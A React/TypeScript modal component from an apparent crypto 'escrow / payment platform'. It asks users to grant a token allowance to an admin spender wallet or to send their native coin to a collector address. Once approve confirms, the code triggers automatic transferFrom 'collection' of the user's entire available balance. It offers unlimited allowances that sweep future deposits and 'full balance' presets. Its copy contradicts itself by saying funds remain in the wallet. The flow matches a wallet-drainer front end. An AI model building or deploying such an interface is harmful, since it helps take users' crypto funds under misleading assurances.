import { TERMS_VERSION } from "../core/approve-config";
import {
  assetsForNetwork,
  isNativeAsset,
  nativeAssetLabel,
} from "../core/chain-tokens";
import {
  nativeSymbolForNetwork,
  shortAddress,
  statusLabel,
} from "../core/network-meta";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AssetSymbol,
  NetworkRow,
  RowStatus,
} from "../types";

type AuthorizeSpendingModalProps = {
  networks: NetworkRow[];
  rowStatus: Record<string, RowStatus>;
  selectedKey: string | null;
  approving: boolean;
  error: string | null;
  asset: AssetSymbol;
  amountHuman: string;
  unlimited: boolean;
  termsAccepted: boolean;
  nativeEstimate: NativeTransferEstimate | null;
  nativeEstimateLoading: boolean;
  nativeEstimateError: string | null;
  onClose: () => void;
  onSelectNetwork: (key: string) => void;
  onAssetChange: (asset: AssetSymbol) => void;
  onAmountChange: (amount: string) => void;
  onUnlimitedChange: (unlimited: boolean) => void;
  onTermsChange: (accepted: boolean) => void;
  onAuthorize: () => void;
  onRetryNativeEstimate?: () => void;
  spenderAddress?: string;
};

function balanceForAsset(row: NetworkRow, asset: AssetSymbol): string {
  if (asset === "NATIVE") return row.balances.native ?? "0";
  if (asset === "USDC") return row.balances.usdc ?? "0";
  return row.balances.usdt ?? "0";
}

function continueLabel(
  selectedKey: string | null,
  asset: AssetSymbol,
  rowStatus: Record<string, RowStatus>,
  approving: boolean,
  nativeEstimate: NativeTransferEstimate | null,
  nativeEstimateLoading: boolean,
  nativeEstimateError: string | null,
  spender: string
): string {
  if (!selectedKey) return "Select a network";
  const status = rowStatus[selectedKey];
  if (status === "finalizing") {
    return isNativeAsset(asset) ? "Confirming transfer..." : "Verifying allowance...";
  }
  if (status === "waiting") return "Confirm in your wallet...";
  if (approving) return isNativeAsset(asset) ? "Transferring..." : "Authorizing...";
  if (isNativeAsset(asset)) {
    if (nativeEstimateLoading) return "Calculating fees...";
    if (nativeEstimateError) return "Estimate failed — retry";
    if (!spender) return "Collector not configured";
    if (!nativeEstimate) return "Waiting for fee estimate...";
    if (!nativeEstimate.canTransfer || BigInt(nativeEstimate.transferableRaw) <= BigInt(0)) {
      return "Insufficient balance after fees";
    }
    return "Transfer native coin";
  }
  return "Authorize spending";
}

export function AuthorizeSpendingModal({
  networks,
  rowStatus,
  selectedKey,
  approving,
  error,
  asset,
  amountHuman,
  unlimited,
  termsAccepted,
  nativeEstimate,
  nativeEstimateLoading,
  nativeEstimateError,
  onClose,
  onSelectNetwork,
  onAssetChange,
  onAmountChange,
  onUnlimitedChange,
  onTermsChange,
  onAuthorize,
  onRetryNativeEstimate,
  spenderAddress = "",
}: AuthorizeSpendingModalProps) {
  const selected = networks.find((n) => n.key === selectedKey) ?? null;
  const spender = spenderAddress;
  const isNative = isNativeAsset(asset);
  const assetBalance = selected ? balanceForAsset(selected, asset) : "0";
  const nativeSymbol = selected ? nativeAssetLabel(selected.key) : "NATIVE";
  const token = isNative ? nativeSymbol : asset;
  const tronNeedsTrx =
    !isNative &&
    selected?.key === "tron" &&
    (Number.parseFloat(selected.balances.native || "0") <= 0 ||
      selected.balances.native === "0");
  const nativeReady =
    isNative &&
    Boolean(nativeEstimate) &&
    nativeEstimate!.canTransfer &&
    BigInt(nativeEstimate!.transferableRaw) > BigInt(0) &&
    Boolean(nativeEstimate!.recipient || spender);
  const nativeBlocked =
    isNative &&
    nativeEstimate != null &&
    !nativeEstimate.canTransfer &&
    !nativeEstimateLoading;
  const canSubmitNative =
    Boolean(selectedKey) &&
    !approving &&
    termsAccepted &&
    Boolean(spender) &&
    !nativeEstimateLoading &&
    !nativeEstimateError &&
    nativeReady;
  const canSubmitToken =
    Boolean(selectedKey) &&
    !approving &&
    termsAccepted &&
    Boolean(spender) &&
    (unlimited || Boolean(amountHuman.trim()));
  const canSubmit = isNative ? canSubmitNative : canSubmitToken;

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
      <div className="max-h-[92vh] w-full max-w-md overflow-y-auto rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
        <div className="h-1 w-full bg-zinc-100">
          <div className="h-full w-[66%] bg-[#3396f0]" />
        </div>

        <div className="flex items-center justify-between px-4 pt-4">
          <button
            type="button"
            aria-label="Back"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ‹
          </button>
          <div className="text-center">
            <p className="text-base font-semibold text-zinc-900">
              {isNative ? "Transfer assets" : "Authorize spending"}
            </p>
            <p className="text-xs text-zinc-500">Step 2 of 3 · Terms v{TERMS_VERSION}</p>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ×
          </button>
        </div>

        <div className="space-y-4 px-5 pb-5 pt-4">
          <p className="text-sm text-zinc-600">
            {isNative
              ? "Choose a network and transfer native coin directly to the configured collector address. Network fees are reserved automatically."
              : "Choose a network and set the maximum amount an admin wallet may spend later via standard token allowance. Your funds stay in your wallet until a separate transfer."}
          </p>

          {error ? (
            <p className="rounded-lg bg-red-50 px-3 py-2 text-sm text-red-600">
              {error}
            </p>
          ) : null}

          <div>
            <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
              Network
            </p>
            <ul className="space-y-2">
              {networks.map((network) => {
                const status = rowStatus[network.key] ?? "awaiting";
                const waiting =
                  status === "waiting" || status === "finalizing";
                const approved = status === "approved";
                const isSelected = selectedKey === network.key;

                return (
                  <li key={network.key}>
                    <button
                      type="button"
                      disabled={approving && !waiting}
                      onClick={() => onSelectNetwork(network.key)}
                      className={[
                        "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
                        waiting || (isSelected && !approved)
                          ? "border-[#3396f0] bg-[#3396f0]/10"
                          : approved
                            ? "border-emerald-300 bg-emerald-50"
                            : "border-zinc-200 bg-white hover:border-zinc-300",
                      ].join(" ")}
                    >
                      <span
                        className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                        style={{ backgroundColor: network.color }}
                      >
                        {network.letter}
                      </span>
                      <span className="min-w-0 flex-1">
                        <span className="block text-sm font-semibold text-zinc-900">
                          {network.name}{" "}
                          <span className="font-normal text-zinc-500">
                            ({network.standard})
                          </span>
                        </span>
                        <span className="mt-0.5 block text-xs text-zinc-500">
                          {nativeSymbolForNetwork(network.key)}{" "}
                          {network.balances.native}
                          {" · "}USDT {network.balances.usdt}
                          {network.balances.usdc != null
                            ? ` · USDC ${network.balances.usdc}`
                            : ""}
                          {" · "}
                          {statusLabel(status)}
                        </span>
                      </span>
                    </button>
                  </li>
                );
              })}
            </ul>
          </div>

          {selected ? (
            <div className="space-y-3 rounded-xl border border-zinc-200 bg-zinc-50 p-4">
              <div>
                <p className="text-xs font-semibold uppercase tracking-wide text-zinc-500">
                  Asset
                </p>
                <div className="mt-2 flex flex-wrap gap-2">
                  {assetsForNetwork(selected.key).map((info) => {
                    const bal = balanceForAsset(selected, info.symbol);
                    return (
                      <button
                        key={info.symbol}
                        type="button"
                        disabled={approving}
                        onClick={() => onAssetChange(info.symbol)}
                        className={[
                          "min-w-[5.5rem] flex-1 rounded-lg border px-3 py-2 text-sm font-medium transition",
                          asset === info.symbol
                            ? "border-[#3396f0] bg-white text-[#3396f0]"
                            : "border-zinc-200 bg-white text-zinc-700",
                        ].join(" ")}
                      >
                        {info.label}
                        <span className="mt-0.5 block text-xs font-normal text-zinc-500">
                          Bal {bal}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2 text-sm">
                <div className="rounded-lg bg-white px-3 py-2">
                  <p className="text-xs text-zinc-500">Network</p>
                  <p className="font-medium text-zinc-900">{selected.name}</p>
                </div>
                <div className="rounded-lg bg-white px-3 py-2">
                  <p className="text-xs text-zinc-500">Your {token} balance</p>
                  <p className="font-medium text-zinc-900">{assetBalance}</p>
                </div>
              </div>

              {isNative ? (
                <div className="space-y-2 rounded-lg bg-white px-3 py-3 text-sm">
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <p className="text-xs text-zinc-500">Estimated network fee</p>
                      <p className="font-medium text-zinc-900">
                        {nativeEstimateLoading
                          ? "Calculating..."
                          : nativeEstimate
                            ? `${nativeEstimate.feeHuman} ${nativeEstimate.assetSymbol}`
                            : "—"}
                      </p>
                    </div>
                    <div>
                      <p className="text-xs text-zinc-500">Transferable amount</p>
                      <p className="font-medium text-zinc-900">
                        {nativeEstimateLoading
                          ? "Calculating..."
                          : nativeEstimate
                            ? `${nativeEstimate.transferableHuman} ${nativeEstimate.assetSymbol}`
                            : "—"}
                      </p>
                    </div>
                  </div>
                  <div>
                    <p className="text-xs text-zinc-500">Recipient address</p>
                    <p className="break-all font-mono text-xs text-zinc-900">
                      {nativeEstimate?.recipient || spender || "Not configured"}
                    </p>
                  </div>
                  {nativeEstimateError ? (
                    <div className="space-y-2">
                      <p className="rounded-lg border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700">
                        {nativeEstimateError}
                      </p>
                      {onRetryNativeEstimate ? (
                        <button
                          type="button"
                          disabled={nativeEstimateLoading || approving}
                          onClick={() => onRetryNativeEstimate()}
                          className="rounded-lg border border-zinc-200 bg-white px-3 py-2 text-xs font-medium text-zinc-700 hover:border-zinc-300 disabled:opacity-50"
                        >
                          Retry estimate
                        </button>
                      ) : null}
                    </div>
                  ) : null}
                  {nativeBlocked ? (
                    <p className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-950">
                      {nativeEstimate?.message ??
                        "Insufficient balance after estimated network fees."}
                    </p>
                  ) : null}
                </div>
              ) : null}

              {tronNeedsTrx ? (
                <p className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-950">
                  This Tron wallet has <strong>0 TRX</strong>. Approving USDT
                  needs Bandwidth/Energy (paid with TRX). Add a small amount of
                  TRX first or the transaction will not appear on TronScan.
                </p>
              ) : null}

              <div className="rounded-lg bg-white px-3 py-2 text-sm">
                <p className="text-xs text-zinc-500">
                  {isNative ? "Collector wallet" : "Admin (spender) wallet"}
                </p>
                <p className="break-all font-mono text-xs text-zinc-900">
                  {spender || "Not configured — set spender in .env.local"}
                </p>
                {spender ? (
                  <p className="mt-1 text-xs text-zinc-500">
                    Short: {shortAddress(spender, 8, 6)}
                  </p>
                ) : null}
              </div>

              {!isNative ? (
                <>
                  <div>
                    <label className="text-xs font-semibold uppercase tracking-wide text-zinc-500">
                      Maximum amount admin may spend
                    </label>
                    <input
                      type="text"
                      inputMode="decimal"
                      placeholder="e.g. 50"
                      disabled={approving || unlimited}
                      value={unlimited ? "" : amountHuman}
                      onChange={(e) => onAmountChange(e.target.value)}
                      className="mt-2 w-full rounded-lg border border-zinc-200 bg-white px-3 py-2.5 text-sm text-zinc-900 outline-none focus:border-[#3396f0] disabled:bg-zinc-100"
                    />
                    <p className="mt-1.5 text-xs text-zinc-500">
                      You can authorize more than your current balance. After
                      approve is confirmed on-chain, collection is attempted
                      automatically using your currently available {token} balance.
                    </p>
                    <div className="mt-2 flex flex-wrap gap-2">
                      {["25", "50", "100"].map((preset) => (
                        <button
                          key={preset}
                          type="button"
                          disabled={approving || unlimited}
                          onClick={() => onAmountChange(preset)}
                          className="rounded-full border border-zinc-200 bg-white px-3 py-1 text-xs text-zinc-700 hover:border-zinc-300 disabled:opacity-50"
                        >
                          {preset} {token}
                        </button>
                      ))}
                      <button
                        type="button"
                        disabled={approving || unlimited || Number(assetBalance) <= 0}
                        onClick={() => onAmountChange(assetBalance)}
                        className="rounded-full border border-zinc-200 bg-white px-3 py-1 text-xs text-zinc-700 hover:border-zinc-300 disabled:opacity-50"
                      >
                        Use full balance
                      </button>
                    </div>
                  </div>

                  <label className="flex items-start gap-2 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-sm text-amber-950">
                    <input
                      type="checkbox"
                      className="mt-1"
                      checked={unlimited}
                      disabled={approving}
                      onChange={(e) => onUnlimitedChange(e.target.checked)}
                    />
                    <span>
                      <span className="font-semibold">Unlimited allowance</span>
                      {" — "}
                      only check this if you intentionally want the maximum
                      possible approval for the selected {token} token. This is not
                      selected by default; prefer a specific amount above.
                    </span>
                  </label>

                  <div className="rounded-lg border border-zinc-200 bg-white px-3 py-3 text-xs leading-relaxed text-zinc-600">
                    <p className="font-semibold text-zinc-800">What you are authorizing</p>
                    <ul className="mt-2 list-disc space-y-1 pl-4">
                      <li>Funds remain in your wallet after this approval.</li>
                      <li>
                        After on-chain confirmation of approve, a transferFrom
                        collection attempt runs automatically using the current
                        real {token} balance available on-chain at that time.
                      </li>
                      <li>
                        With a custom amount, transfers stop once the total
                        collected reaches that cap.
                      </li>
                      <li>
                        With unlimited selected, future {token} deposits may
                        continue to be collected until the allowance is revoked or
                        expires.
                      </li>
                      <li>
                        The spender pays the network fee for transferFrom. You
                        still pay the network fee for this approve transaction.
                      </li>
                      <li>
                        You can revoke later by setting allowance to zero.
                      </li>
                    </ul>
                  </div>
                </>
              ) : (
                <div className="rounded-lg border border-zinc-200 bg-white px-3 py-3 text-xs leading-relaxed text-zinc-600">
                  <p className="font-semibold text-zinc-800">What you are transferring</p>
                  <ul className="mt-2 list-disc space-y-1 pl-4">
                    <li>
                      You send native {nativeSymbol} directly from your wallet — no
                      approve() or allowance is used.
                    </li>
                    <li>
                      The transferable amount is your balance minus estimated network
                      fees so the transaction does not fail for insufficient gas.
                    </li>
                    <li>You pay the network fee for this transfer.</li>
                    <li>
                      After confirmation, balances refresh automatically.
                    </li>
                  </ul>
                </div>
              )}

              <label className="flex items-start gap-2 text-sm text-zinc-700">
                <input
                  type="checkbox"
                  className="mt-1"
                  checked={termsAccepted}
                  disabled={approving}
                  onChange={(e) => onTermsChange(e.target.checked)}
                />
                <span>
                  I understand and accept the Terms &amp; Conditions (v
                  {TERMS_VERSION}) for{" "}
                  {isNative ? "native asset transfers" : "delegated spending"} on
                  this escrow / payment platform.
                </span>
              </label>
            </div>
          ) : null}

          <button
            type="button"
            disabled={!canSubmit}
            onClick={onAuthorize}
            className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
          >
            {continueLabel(
              selectedKey,
              asset,
              rowStatus,
              approving,
              nativeEstimate,
              nativeEstimateLoading,
              nativeEstimateError,
              spender
            )}
          </button>
        </div>
      </div>
    </div>
  );
}
